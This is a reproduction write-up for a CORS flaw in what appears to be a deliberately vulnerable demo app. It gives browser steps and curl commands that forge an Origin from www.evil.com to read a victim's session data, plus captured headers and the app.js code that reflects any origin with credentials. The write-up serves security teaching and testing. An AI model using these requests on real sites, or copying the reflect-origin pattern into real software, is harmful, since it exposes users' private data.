# Part 1 — CORS Vulnerability: Reproduction Evidence

## Browser walkthrough (visual reproduction)

Prerequisite: add to `/etc/hosts`:
```
127.0.0.1  www.nc.com www.evil.com
```

Steps:
1. Visit `https://www.nc.com:3000/` and confirm the "Requirements" (third-party cookies allowed, hosts entries present).
2. Follow **"Theft successful - Set allow to Origin"** -> lands on `https://www.nc.com:3000/cors/allow-origin/index`.
3. Click **"Womens health blog (attacker)"** first (`https://www.evil.com:3000/cors/allow-origin/attacker`) — observe it initially fails to steal data (no session yet) and offers a login link.
4. Log in via that link at `https://www.nc.com:3000/cors/allow-origin/webapp` (sets `superSecretSession` cookie, `SameSite=None; Secure`, non-HttpOnly).
5. Navigate back to the attacker page (`https://www.evil.com:3000/cors/allow-origin/attacker`) and reload.
6. `public/front.js` fires a credentialed cross-origin `POST` to `https://www.nc.com:3000/json-cors-origin/appInit`. The response is echoed on the attacker page as stolen account data ("Success! Stolen data for user: ...", pregnancy/sexual activity fields, threatening message).

## Automated curl reproduction (no browser needed)

The vulnerability is entirely reproducible with plain `curl` because the server decides CORS headers purely from the request's `Origin` header — it does not matter what hostname is used to reach it.

```bash
# 1. Baseline: request with no Origin header (e.g. same-origin / non-browser client)
curl -sk https://localhost:3000/json-cors-origin/appInit -X POST \
  -H "Cookie: superSecretSession=123" -D - -o /dev/null

# 2. Attack: credentialed cross-origin request pretending to be www.evil.com
curl -sk https://localhost:3000/json-cors-origin/appInit -X POST \
  -H "Origin: https://www.evil.com:3000" \
  -H "Cookie: superSecretSession=123" \
  -H "Content-Type: application/json" \
  -D - -o stolen_body.json
```

### Captured result (2026-07-23)

Baseline response headers:
```
HTTP/1.1 200 OK
Content-Type: application/json
Vary: Origin
Access-Control-Allow-Origin: https://localhost:3000
Access-Control-Allow-Credentials: true
```

Attack response headers — note `Access-Control-Allow-Origin` **reflects the attacker's Origin verbatim**, combined with credentials allowed:
```
HTTP/1.1 200 OK
Content-Type: application/json
Vary: Origin
Access-Control-Allow-Origin: https://www.evil.com:3000
Access-Control-Allow-Credentials: true
```

`stolen_body.json` contains the full `backendResponse` payload (user locale, subscription/product data, PII-shaped fields) — i.e. any page running on `https://www.evil.com:3000` that a logged-in victim visits can read this via `fetch`/`XMLHttpRequest` with `credentials: 'include'`, exactly as `public/front.js` demonstrates.

## Root cause (code reference)

`app.js:78-92` (`/json-cors-origin/*` branch):
```js
} else if (req.path.startsWith("/json-cors-origin/")) {
  if (req.get("Origin") != null) {
    res.setHeader('Access-Control-Allow-Origin', req.get("Origin"));   // <-- reflects ANY origin
  } else {
    res.setHeader('Access-Control-Allow-Origin', "https://" + req.hostname + ":3000");
  }
  res.setHeader('Access-Control-Allow-Credentials', 'true');           // <-- with credentials allowed
  ...
}
```
This combination — reflecting an arbitrary `Origin` back as `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true` — is the textbook CORS misconfiguration: it fully defeats the Same-Origin Policy for authenticated (cookie-bearing) requests from *any* origin on the internet.
